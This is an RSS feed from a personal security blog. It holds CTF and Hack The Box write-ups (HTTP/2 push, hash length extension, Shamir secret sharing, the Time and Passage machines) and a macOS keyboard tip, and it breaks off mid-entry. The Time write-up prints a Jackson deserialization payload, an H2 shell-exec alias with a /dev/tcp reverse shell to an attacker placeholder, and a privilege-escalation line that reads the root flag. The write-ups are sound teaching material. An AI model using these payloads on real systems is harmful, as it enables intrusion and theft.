<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Inês Martins]]></description><link>https://inesmartins.github.io//</link><image><url>https://inesmartins.github.io//favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io//</link></image><generator>Ghost 4.3</generator><lastBuildDate>Fri, 28 May 2021 11:30:59 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io//rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC - HTTP2]]></title><description><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-84.png 600w, https://inesmartins.github.io//content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-85.png 600w, https://inesmartins.github.io//content/images/2021/05/image-85.png 788w" sizes="(min-width: 720px) 720px"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol,</p>]]></description><link>https://inesmartins.github.io//http3/</link><guid isPermaLink="false">60aa1e4ce1e20f0a69e2a808</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Fri, 28 May 2021 11:30:46 GMT</pubDate><content:encoded><![CDATA[<blockquote>URL: <a href="https://20.56.49.147/">https://20.56.49.147/</a> | Keep calm and get the flag :)</blockquote><p>When you enter the IP directly on the browser you see only an image sourced <a href="https://github.com/verhas/pushbuilder">from Github</a> and a hidden clue: &quot;Lost? It&apos;s evolution, baby...&quot;:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-84.png" class="kg-image" alt loading="lazy" width="860" height="352" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-84.png 600w, https://inesmartins.github.io//content/images/2021/05/image-84.png 860w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-85.png" class="kg-image" alt loading="lazy" width="788" height="123" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-85.png 600w, https://inesmartins.github.io//content/images/2021/05/image-85.png 788w" sizes="(min-width: 720px) 720px"></figure><p>The image shows the evolution of the <code>HTTP</code> protocol, so it makes sense that this challenge is about some HTTP feature, either new or deprecated.</p><p>Using <code>curl</code> to fetch the page we see that it&apos;s served via <code>HTTP/2</code>, which is still kind of rare in the wild:</p><pre><code>~ curl -ik https://20.56.49.147/
HTTP/2 200
server: nginx/1.19.10
date: Fri, 28 May 2021 11:27:17 GMT
content-type: text/html
content-length: 129
last-modified: Thu, 20 May 2021 10:10:20 GMT
etag: &quot;60a6358c-81&quot;
accept-ranges: bytes

&lt;img src=&quot;https://raw.githubusercontent.com/verhas/pushbuilder/master/http-versions.png&quot;&gt;
&lt;!-- Lost? It&apos;s evolution, baby... --&gt;</code></pre><p><code>HTTP/2</code> supports the <a href="https://www.smashingmagazine.com/2017/04/guide-http2-server-push/">Server Push</a> feature, which basically enables servers to send assets to the client without the client having to request them, which is the perfect setup for a hidden file, like the flag.</p><p>In order to log these &quot;hidden&quot; request, we can use <a href="chrome://net-export/">Chrome Net Export tool</a>:</p><ul><li>Open up a new Chrome tab and enter <code>chrome://net-export/</code>:</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-86.png" class="kg-image" alt loading="lazy" width="1167" height="415" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-86.png 600w, https://inesmartins.github.io//content/images/size/w1000/2021/05/image-86.png 1000w, https://inesmartins.github.io//content/images/2021/05/image-86.png 1167w" sizes="(min-width: 720px) 720px"></figure><ul><li>Click &quot;Start Logging to Disk&quot; and choose the file where you want to write on your computer;</li><li>Go to the challenge website and reload it;</li><li>Go back to the Chrome Net Export tool and click &quot;Stop Logging&quot;;</li><li>Click &quot;Show file&quot; to see the log file;</li><li>Search for the word <code>flag</code> among the results:</li></ul><pre><code>...
{
   &quot;params&quot;:{
      &quot;headers&quot;:[
         &quot;:method: GET&quot;,
         &quot;:path: /flag_652f92e28feb20d2dc22874d54cefb9b0cf96ce5c65552161fdaad4a33776394.txt&quot;,
         &quot;:scheme: https&quot;,
         &quot;:authority: 20.56.49.147&quot;,
         &quot;accept-encoding: gzip, deflate, br&quot;,
         &quot;accept-language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7&quot;,
         &quot;user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot;
      ],
      &quot;id&quot;:1,&quot;promised_stream_id&quot;:2
   },
   ...
},
...</code></pre><ul><li>Access the resource and get the flag:</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/image-87.png" class="kg-image" alt loading="lazy" width="951" height="92" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/image-87.png 600w, https://inesmartins.github.io//content/images/2021/05/image-87.png 951w" sizes="(min-width: 720px) 720px"></figure><p>Note that alternatively, we could have simply used <a href="https://nghttp2.org/">Nghttp2</a>.</p>]]></content:encoded></item><item><title><![CDATA[Fixing keyboard type on macOS]]></title><description><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go</li></ul>]]></description><link>https://inesmartins.github.io//having-issues-with-your-keyboard-type-on-macos/</link><guid isPermaLink="false">609fdd03f0e974043bb7b5c0</guid><category><![CDATA[macOS]]></category><category><![CDATA[troubleshooting]]></category><category><![CDATA[keyboard type]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 15 May 2021 14:56:08 GMT</pubDate><content:encoded><![CDATA[<p>It seems like Big Sur is randomly defaulting the keyboard type to ANSI and, for some weird reason, Apple has removed the ability to change this directly on the keyboard settings. </p><h3 id="what-to-do">What to do?</h3><p>Apparently, the only thing to do is to force the OS to re-configure the keyboard:</p><ul><li>Go to <code>/Library/Preferences</code> and see if you can find <code>com.apple.keyboardtype.plist</code></li></ul><pre><code>~ cd /Library/Preferences
~ ls | grep keyboard</code></pre><ul><li>Either remove it or move it somewhere else (if you want to have a backup)</li></ul><pre><code>~ sudo rm com.apple.keyboardtype.plist</code></pre><ul><li>Restart the computer</li><li>You&apos;ll be prompted to setup your keyboard again</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/1-1.png" class="kg-image" alt loading="lazy" width="700" height="510" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/1-1.png 600w, https://inesmartins.github.io//content/images/2021/05/1-1.png 700w"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/2.png" class="kg-image" alt loading="lazy" width="723" height="530" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/2.png 600w, https://inesmartins.github.io//content/images/2021/05/2.png 723w" sizes="(min-width: 720px) 720px"></figure><ul><li>Confirm your keyboard type and that&apos;s it</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/05/3.png" class="kg-image" alt loading="lazy" width="686" height="512" srcset="https://inesmartins.github.io//content/images/size/w600/2021/05/3.png 600w, https://inesmartins.github.io//content/images/2021/05/3.png 686w"></figure>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Don Joe [Crypto]]]></title><description><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p>]]></description><link>https://inesmartins.github.io//oposec-don-joe/</link><guid isPermaLink="false">6070c230e97e6981d27339e2</guid><category><![CDATA[crypto]]></category><category><![CDATA[cryptography]]></category><category><![CDATA[sha2]]></category><category><![CDATA[sha256]]></category><category><![CDATA[hashpump]]></category><category><![CDATA[hash_extender,]]></category><category><![CDATA[length extension attack]]></category><category><![CDATA[owasp zap]]></category><category><![CDATA[LFI]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 01 May 2021 09:38:18 GMT</pubDate><content:encoded><![CDATA[<blockquote>Don Joe insists his site is as secure as can be! Can you prove that the best web dev of all time is wrong?&quot;<br>URL: <a href="https://don-joes-blog.herokuapp.com/" rel="noopener noreferrer">https://don-joes-blog.herokuapp.com/</a> <br>There are two flags</blockquote><p>Don Joe&apos;s Blog has a very simple interface and lists only 4 blog posts:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-3.png" class="kg-image" alt loading="lazy"></figure><p>Clicking on the articles we can see that they&apos;re being fetched using the <code>id</code> query parameter:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-4.png" class="kg-image" alt loading="lazy"></figure><p>Luckily I didn&apos;t even have to do any tests, <a href="https://www.zaproxy.org/">OWASP Zap</a> immediately let me know how to exploit this <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">LFI vulnerability</a>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-5.png" class="kg-image" alt loading="lazy"></figure><p>So, let&apos;s see what we can find on <code>etc/passwd</code>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-6.png" class="kg-image" alt loading="lazy"></figure><p>One flag down!</p><hr><h2 id="m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</h2><p>When we go to the <a href="http://don-joes-blog.herokuapp.com/m4st3rfully_h1dd3n">m4st3rfully_h1dd3n</a> directory we find the project&apos;s source code:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-7.png" class="kg-image" alt loading="lazy"></figure><p>As instructed, let&apos;s login as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-8.png" class="kg-image" alt loading="lazy"></figure><p>After logging in we see the same &quot;hidden&quot; home page, but now authenticated as <code>supreme_user</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-9.png" class="kg-image" alt loading="lazy"></figure><p>The session is maintained using a cookie called <code>auth</code>:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-10.png" class="kg-image" alt loading="lazy"></figure><p>When we base64-decode the cookie (<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64(&apos;A-Za-z0-9%2B/%3D&apos;,true)&amp;input=ZFhObGNtNWhiV1U5YzNWd2NtVnRaVjkxYzJWeU8zTmxZM0psZEQxaFpqTTFNV1kwTkRNeE16Qm1Nelk1WXpCalpHVTVPREl4TVRCaE1EZGlZamhtT0RneE1USmpZMlppTUdJNU1qTTJaV0ZqTVdVeVlUSXpZMkl3TlRReE93PT0">using CyberChef</a>) we see the authenticated user data plus some encrypted data, which should be some sort of checksum:</p><figure class="kg-card kg-image-card kg-width-full"><img src="https://inesmartins.github.io//content/images/2021/04/image-1.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="analysing-the-source-code">Analysing the source code</h2><p>Looking at the source code we can see that there is a user DB (<code>users_db.py</code>) with 2 users, <code>supreme_user</code> and <code>admin</code>:</p><pre><code>{&quot;username&quot;: &quot;supreme_user&quot;, &quot;password&quot;: &quot;af351f443130f369c0cde982110a07bb8f88112ccfb0b9236eac1e2a23cb0541&quot;, &quot;role&quot;: 0},
{&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;2ae3a0f2ef89bf388e7cdc7f5fc9f1b60e5542d0a6c2f6f1cf88190d0ab2b711&quot;, &quot;role&quot;: 1}
</code></pre><p>Searching for flag-related methods we see the <code>admin_flag()</code> function, which is triggered by navigating to the <code>admin</code> route. In short, if the user is authenticated as <code>admin</code> the application renders the final flag, else it displays the &quot;Forbidden&quot; route page:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-11.png" class="kg-image" alt loading="lazy"></figure><p>The <code>is_admin</code> function:</p><ol><li>checks for a valid session;</li><li>checks that there&apos;s a user that matches the session;</li><li>prints some debug info;</li><li>returns <code>true</code> if the user role is <code>1</code>, which from what we can see is only true for the <code>admin</code> user.</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-12.png" class="kg-image" alt loading="lazy"></figure><p>The <code>get_session</code> function checks the <code>auth</code> cookie and then returns the parsed data:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-13.png" class="kg-image" alt loading="lazy"></figure><p>The <code>parse_session</code> function:</p><ol><li>splits the cookie into data and signature;</li><li><code>base64</code>-decodes both parts of the cookie;</li><li>checks that the data matches the signature;</li><li>returns all the fields on the decoded data as a dictionary.</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-14.png" class="kg-image" alt loading="lazy"></figure><p>Now for the signature checking, it seems like the data is appended to some random <code>SECRET</code> value and then hashed using <code>SHA-256</code>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-15.png" class="kg-image" alt loading="lazy"></figure><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-16.png" class="kg-image" alt loading="lazy"></figure><p>However, the <code>SECRET</code> is not easily brute-forceable since it contains between 8 and 15 random bytes:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-17.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="length-extension-attack">Length Extension Attack</h2><blockquote>TL;DR: given a hash that is composed of a string with an unknown prefix, an attacker can append to the string and produce a new hash that still has the unknown prefix. [<a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Source</a>]</blockquote><p>Knowing that this vulnerability affects <code>SHA-256</code>, we can create a script that:</p><ol><li>retrieves a valid <code>auth</code> cookie for the <code>supreme_user</code> by authenticating with the known credentials;</li></ol><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-21.png" class="kg-image" alt loading="lazy"></figure><p>2. for all possible lengths of <code>SECRET</code>, uses <a href="https://github.com/iagox86/hash_extender">hash_extender</a> to create valid cookies with the admin authentication data (username and hashed password):</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/04/image-24.png" class="kg-image" alt loading="lazy"></figure><p>3. for each of the cookies, try to access the <code>admin</code> route and see if one of the cookies is a valid form of authentication:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-26.png" class="kg-image" alt loading="lazy"></figure><p>4. Putting it all together we get a hit!</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/04/image-25.png" class="kg-image" alt loading="lazy"></figure><p><br></p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Time]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb

PORT   STATE SERVICE VERSION
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu</code></pre>]]></description><link>https://inesmartins.github.io//htb-write-up-time/</link><guid isPermaLink="false">5f95bf0d501631398681f989</guid><category><![CDATA[htb]]></category><category><![CDATA[jackson]]></category><category><![CDATA[deserialization]]></category><category><![CDATA[deserialisation]]></category><category><![CDATA[fasterxml]]></category><category><![CDATA[json]]></category><category><![CDATA[h2]]></category><category><![CDATA[sql]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 03 Apr 2021 13:50:00 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/04/banner.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/286">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="https://inesmartins.github.io//content/images/2021/04/banner.png" alt="HTB Write-up | Time"><p>It seems like this machine is running <code>OpenSSH</code> on port 22 and an <code>Apache</code> web server on port 80:</p><pre><code>~ nmap -sC -sV time.htb

PORT   STATE SERVICE VERSION
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser</code></pre><p>When we access the website, we see a simple JSON &quot;beautifier&quot; and validator.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/10/image-2.png" class="kg-image" alt="HTB Write-up | Time" loading="lazy"></figure><p>After submitting a couple of invalid JSON objects, it was clear from the error responses that the JSON was being parsed and validated using <a href="https://github.com/FasterXML/jackson-docshttps://github.com/FasterXML/jackson">Jackson</a>:</p><pre><code>Validation failed: Unhandled Java exception:
com.fasterxml.jackson.databind.exc.MismatchedInputException: 
Unexpected token (START_OBJECT), expected VALUE_STRING: 
need JSON String that contains type id (for subtype of java.lang.Object)</code></pre><p>Turns out this parser has <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-15866/product_id-34008/Fasterxml-Jackson.html">3 CVEs</a>, all to do with deserialisation vulnerabilities.</p><p><a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">This</a> is a very good article that explains the root of these vulnerabilities and how to exploit them.</p><hr><h2 id="exploiting-jackson">Exploiting Jackson</h2><p>Since this version of Jackson already blocklists some insecure types, I had to rely on <a href="https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf">this</a> BlackHat presentation from 2019 to find a valid exploit:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/11/image-1.png" class="kg-image" alt="HTB Write-up | Time" loading="lazy"></figure><p>After going through <a href="https://blog.doyensec.com/2019/07/22/jackson-gadgets.html">this</a> article, I realised that the easiest way to achieve an RCE using <code>DriverManagerConnectionSource</code> would be to abuse H2&apos;s <a href="http://www.h2database.com/html/features.html#execute_sql_on_connection">INIT=RUNSCRIPT FROM</a> feature. </p><p>Using this option, a database can be initialised with a SQL file that&apos;s hosted on the attacker&apos;s machine (I used <code>python -m SimpleHTTPServer 8000</code> to serve it).</p><pre><code class="language-JSON">[
    &quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, 
    {
    	&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &apos;http://[attacker-ip]:8000/inject.sql&apos;&quot;
     }
]</code></pre><p>This SQL file also abuses an H2 feature - <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">Database ALIAS</a> - to create the reverse shell, as shown below:</p><pre><code class="language-SQL">CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {&quot;bash&quot;, &quot;-c&quot;, cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\\A&quot;);
    return s.hasNext() ? s.next() : &quot;&quot;;  }$$;
CALL SHELLEXEC(&apos;bash -i &gt;&amp; /dev/tcp/[attacker-ip]/[attacker-port] 0&gt;&amp;1&apos;)</code></pre><p>And we get a shell as <code>pericles</code>, which in this case also gives us the ability to read the user flag!</p><hr><h2 id="pericles-gets-root">pericles gets root</h2><p>While looking for files that belonged to group <code>pericles</code>, I saw something that caught my eye:</p><pre><code>pericles@time:~$ find / -group pericles

...
/usr/bin/timer_backup.sh
...</code></pre><pre><code>pericles@time:~$ cat /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip</code></pre><p>It looks like this script is periodically zipping the <code>/var/www/html</code> directory and then moving the zip file to the <code>root</code> directory.</p><p>This means that the script<em> can</em> access the <code>root</code> directory, which we can abuse by adding an extra line to it that writes the root flag to a directory accessible to our user, such as <code>tmp</code>:</p><pre><code>pericles@time:~$ echo &apos;cat /root/root.txt &gt; /tmp/out&apos; &gt;&gt; /usr/bin/timer_backup.sh

pericles@time:~$ cat  /usr/bin/timer_backup.sh
#!/bin/bash
zip -r website.bak.zip /var/www/html &amp;&amp; mv website.bak.zip /root/backup.zip
cat /root/root.txt &gt; /tmp/out</code></pre><p>Our <code>root</code> flag is now at <code>/tmp/out</code>.</p><p>And we&apos;re done &#x1F60A;</p>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC - Secrets [Crypto]]]></title><description><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That&apos;s easy! - Just implement a very secure, hackerproof&#x2122; secret sharing web application!&quot;<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image" alt loading="lazy"></figure><p>Entering random</p>]]></description><link>https://inesmartins.github.io//oposec-secrets/</link><guid isPermaLink="false">6040b267b4729d033918cd72</guid><category><![CDATA[cryptography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[shamir]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 24 Mar 2021 21:31:29 GMT</pubDate><content:encoded><![CDATA[<blockquote>We all have secrets! And sometimes we need to share them with our online friends, safely... That&apos;s easy! - Just implement a very secure, hackerproof&#x2122; secret sharing web application!&quot;<br>URL: <a href="https://secret.mbie.me/" rel="noopener noreferrer">https://secret.mbie.me</a></blockquote><p>When you access the website you see the following page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/03/image-11.png" class="kg-image" alt loading="lazy"></figure><p>Entering random data on the input field doesn&apos;t seem to provide us with any interesting information:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-13.png" class="kg-image" alt loading="lazy"></figure><p>Using <a href="https://github.com/xmendez/wfuzz">wfuzz</a> I found a new page:</p><pre><code>~ wfuzz -c --hc 404 -w big.txt https://secret.mbie.me/FUZZ

...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000016081:   200        16 L     42 W       425 Ch      &quot;secret&quot;</code></pre><p>The <a href="https://secret.mbie.me/secret">/secret</a> page displays a message with a link to the <a href="https://secret.mbie.me/getShare">/getShare</a> page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/03/image-3.png" class="kg-image" alt loading="lazy"></figure><p>The <a href="https://secret.mbie.me/getShare">/getShare</a> page retrieves a &quot;secret share&quot;, and we can also see from the previous message that <strong>collecting 3 of these</strong> <strong>might be of interest </strong>to us, which points in the direction of some cryptographic attack ...</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-4.png" class="kg-image" alt loading="lazy"></figure><hr><h2 id="getting-more-secret-shares">Getting more secret shares</h2><p>After taking a closer look at the GET request to <a href="https://secret.mbie.me/getShare">/getShare</a> we see that we can manipulate the <code>shareholderId</code> value set in the Cookie:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/03/image-5.png" class="kg-image" alt loading="lazy"></figure><p>Using <a href="https://portswigger.net/burp/documentation/desktop/tools/intruder/using">Burp Intruder</a> to brute-force this field, we&apos;re unable to retrieve the secret share of users with <code>shareholderId</code>&apos;s between 1 and 499:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2021/03/image-7.png" class="kg-image" alt loading="lazy"></figure><p>For requests with ID&apos;s above 500 we see the following:</p><pre><code>{&quot;500&quot;:12876858175638.0}
{&quot;501&quot;:12876870698406.0}
{&quot;502&quot;:12876883245936.0}
{&quot;503&quot;:12876895818228.0}
...
{&quot;824&quot;:12882211248882.0} [DEFAULT]
{&quot;825&quot;:12882231794538.0}
{&quot;826&quot;:12882252364956.0}
{&quot;827&quot;:12882272960136.0}
...
{&quot;1000&quot;:12886208619138.0} 
{&quot;1001&quot;:12886233522906.0}
{&quot;1002&quot;:12886258451436.0}
{&quot;1003&quot;:12886283404728.0}
...
infinite</code></pre><p>It wasn&apos;t hard to figure out that as we increment the <code>shareholderId</code> the secret share is equal to the previous shareholder&apos;s secret share plus a difference that increments by <code>24672</code>, which means these secrets are not random data encrypted with any typical key, they&apos;re something else.</p><pre><code>ID    Secret Share        Diff from previous

...
822   12882170231856.0
823   12882190727988.0    +20496132
824   12882211248882.0    +20520894    +24762
825   12882231794538.0    +20545656    +24762
826   12882252364956.0    +20570418    +24762
...</code></pre><hr><h2 id="shamir-s-secret-sharing">Shamir&apos;s Secret Sharing</h2><p>After a bit of googling I ended up stumbling upon this concept of secret sharing: </p><blockquote>(...) a secret is divided into parts, giving each participant its own unique part. To reconstruct the original secret, a minimum number of parts is required. In the threshold scheme this number is less than the total number of parts. Otherwise all participants are needed to reconstruct the original secret.</blockquote><p>In this case, we already know that we only need 3 shares to reconstruct the original secret, from the hint on the /secret page.</p><p>On <a href="https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing">the Wikipedia page</a> we can see an example of an implementation of this algorithm in Python, which I adapted to fit the data we&apos;ve already collected:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-16.png" class="kg-image" alt loading="lazy"></figure><p>The result is <code>12873698232138</code> which when we enter as the secret gives us the flag:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2021/03/image-17.png" class="kg-image" alt loading="lazy"></figure>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Passage]]></title><description><![CDATA[Write-up for Passage, a retired HTB machine.]]></description><link>https://inesmartins.github.io//htb-passage/</link><guid isPermaLink="false">5f69aa685c95ba072b855f70</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Mar 2021 12:40:44 GMT</pubDate><media:content url="https://inesmartins.github.io//content/images/2021/03/passage.png" medium="image"/><content:encoded><![CDATA[<blockquote><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/275">here</a>.</em></blockquote><h2 id="scanning">Scanning</h2><pre><code>~ nmap -sV -sC passage.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News</code></pre><img src="https://inesmartins.github.io//content/images/2021/03/passage.png" alt="HTB Write-up | Passage"><p>This one is pretty straightforward: </p><ul><li><code>SSH</code> on port 22;</li><li>an <code>Apache</code> web server on port 80.</li></ul><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/09/image-18.png" class="kg-image" alt="HTB Write-up | Passage" loading="lazy"></figure><p>The website was apparently developed using <a href="https://cutephp.com/">CuteNews</a>, a PHP-based news management system. All of the articles look like &quot;Lorem Ipsum&quot; except for <a href="http://passage.htb/index.php?id=11">the first one</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://inesmartins.github.io//content/images/2020/09/image-20.png" class="kg-image" alt="HTB Write-up | Passage" loading="lazy"></figure><p>In fact, all article IDs between 8 and 11 redirect to this article about the implementation of &quot;Fail2Ban&quot;. </p><p>The article&apos;s author is called <code>admin</code>. Their profile link shows us an interesting email: <a href="https://inesmartins.github.io//p/3c0d4057-391e-4661-a683-f8761c1b8df1/nadav@passage.htb">nadav@passage.htb</a>.</p><p>Looking at the other articles we find the name of 3 other authors:</p><ul><li>Sid Meier</li><li>Kim Swift</li><li>James</li></ul><hr><h2 id="exploiting-cutenews-vulnerabilities">Exploiting CuteNews vulnerabilities</h2><p>After doing a quick search for vulnerabilities on version 2.1.2., I found <a href="https://www.cvedetails.com/cve/CVE-2019-11447/">CVE-2019-11447</a>:</p><blockquote>(...) An attacker can infiltrate the server through the avatar upload process in the profile area via the <code>avatar_file</code> field to 